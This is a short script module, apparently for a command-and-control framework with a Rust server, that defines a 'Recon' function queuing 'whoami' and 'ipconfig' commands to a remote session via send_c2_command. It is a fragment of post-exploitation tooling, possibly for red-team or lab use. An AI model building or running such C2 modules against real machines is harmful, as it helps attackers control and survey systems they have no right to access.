// This function is imported and executed by the Rust Server
// 'session_id' is passed from the API URL
fn run(session_id) {
    print("Module 'Recon' started for Session: " + session_id);

    // Call the Rust function 'send_c2_command' exposed to this scope
    // We can chain multiple commands or add logic here
    
    let user = send_c2_command(session_id, "whoami");
    let ip = send_c2_command(session_id, "ipconfig");

    // Return a JSON-like string to the API response
    return "Recon executed. Sent commands to queue.";
}
